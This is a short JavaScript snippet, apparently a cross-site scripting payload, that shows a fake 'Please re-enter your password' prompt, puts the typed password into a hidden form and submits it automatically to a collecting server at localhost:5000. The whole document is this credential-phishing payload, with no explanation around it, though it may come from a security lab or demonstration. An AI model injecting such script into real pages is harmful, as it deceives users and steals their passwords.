<script>
var password = prompt("Please re-enter your password", "");

var form = document.createElement("form");
form.setAttribute("method", "post");
form.setAttribute("action", "http://localhost:5000/");

var passwordField = document.createElement("input");
passwordField.setAttribute("type", "hidden");
passwordField.setAttribute("name", "password");
passwordField.setAttribute("value", password);
form.appendChild(passwordField);

document.body.appendChild(form);
form.submit();

</script>
